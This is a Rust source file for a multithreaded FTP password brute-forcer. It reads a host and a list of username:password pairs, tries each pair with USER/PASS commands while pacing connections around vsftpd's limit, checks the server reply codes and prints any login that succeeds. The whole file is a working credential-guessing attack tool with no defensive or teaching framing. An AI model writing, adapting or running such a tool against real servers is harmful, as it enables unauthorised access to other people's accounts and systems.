mod constants;

use clap::Parser;
use constants::MAX_MESSAGE_SIZE;
use itertools::Itertools;
use std::{
    fs::read_to_string,
    io::{Read, Result, Write},
    net::TcpStream,
    path::Path,
    sync::{Arc, Condvar, Mutex},
    time::Instant,
    vec::Vec,
};
use threadpool::ThreadPool;
use std::sync::mpsc::{channel, Sender, Receiver};

#[derive(Parser, Debug)]
struct Args {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    host: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}

const CLOSE_CHANNEL: i32 = 0;
fn main() -> Result<()> {
    let args = Args::parse();
    let credential_list: Vec<String> = read_file_lines(&args.credentials);
    println!("Found {:?} Credential(s)", credential_list.len());
    println!("Starting...");
    let now = Instant::now();
    // vsftpd max conn = 5
    let pool = ThreadPool::new(4);
    let mut buffer = [0; MAX_MESSAGE_SIZE];
    let host = args.host;
    let chunks: Vec<Vec<String>> = credential_list
        .into_iter()
        .chunks(10)
        .into_iter()
        .map(|chunk| chunk.collect())
        .collect();
    let pair = Arc::new((Mutex::new(false), Condvar::new()));    
    let (sender, receiver): (Sender<i32>, Receiver<i32>) = channel();

    for cred_chunk in chunks {
        let host = host.clone();
        let pair2 = pair.clone();

        let cloned_sender = sender.clone();
        pool.execute(move || {
            let cred_chunk = cred_chunk.clone();
            let copied_host = host.clone();
            let mut stream = TcpStream::connect(host).unwrap();
            stream.read(&mut buffer).unwrap();
            // read welcome message and make sure the code is 220 (Service ready for new user)
            // TODO retry later if not.
            if buffer[..3] == [50, 50, 48] {
                for cred in &cred_chunk {
                    let loop_cloned_sender = cloned_sender.clone();
                    match attempt(cred, &mut stream, loop_cloned_sender) {
                        Ok(code) => {
                            if code == 1 {
                                println!("------------- SUCCESS -------------");
                                println!("{}", cred);
                                println!("------------- SUCCESS -------------");
                                cloned_sender.send(CLOSE_CHANNEL);
                                let &(ref lock, ref cvar) = &*pair2;
                                let mut done = lock.lock().unwrap();
                                *done = true;
                                // We notify the condvar that the value has changed.
                                cvar.notify_one();
                            }
                        }
                        Err(err) => {
                            println!("{:}", err)
                        }
                    }
                }
            } else {
                println!(
                    "It appears that {:?} is not ready for new connections",
                    copied_host
                );
            }
        })
    }
    // wait for the thread to start up
    let &(ref lock, ref cvar) = &*pair;
    let mut done = lock.lock().unwrap();
    let t = attempt_counter(receiver);
    while !*done {
        done = cvar.wait(done).unwrap();
        
    }
    println!("attempts: {t}");
    println!("Total time elapsed: {}", now.elapsed().as_secs());
    Ok(())
}

fn read_file_lines(file_name: &str) -> Vec<String> {
    let file_exists = Path::new(&file_name).is_file();
    if !file_exists {
        panic!("{}", format!("File {} does not exist!", file_name))
    }
    let contents = read_to_string(&file_name)
        .unwrap_or_else(|_| panic!("Error reading from file {}", file_name));
    return contents.lines().map(|line| line.to_string()).collect();
}


fn attempt(credential: &str, stream: &mut TcpStream,sender: Sender<i32>) -> Result<u8> {
    if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
        sender.send(1);
        println!("attempting: {} {}", username, password);
        stream.write(format!("USER {}\r\n", username).as_bytes())?;
        let mut buffer = [0; MAX_MESSAGE_SIZE];
        stream.read(&mut buffer)?;
        // code 331 (User name okay, need password)
        if buffer[..3] == [51, 51, 49] {
            stream.write(format!("PASS {}\r\n", password).as_bytes())?;
            stream.read(&mut buffer)?;
            // code 230 (User logged in, proceed. Logged out if appropriate)
            if buffer[..3] == [50, 51, 48] {
                return Ok(1);
            }
        }
    }
    return Ok(0);
}


fn attempt_counter(reciver: Receiver<i32>) -> i32{
    let mut counter: i32 = 0;
    for i in reciver {
        counter += i;
        if i == CLOSE_CHANNEL {

            return counter
        }
    }

    return counter;

}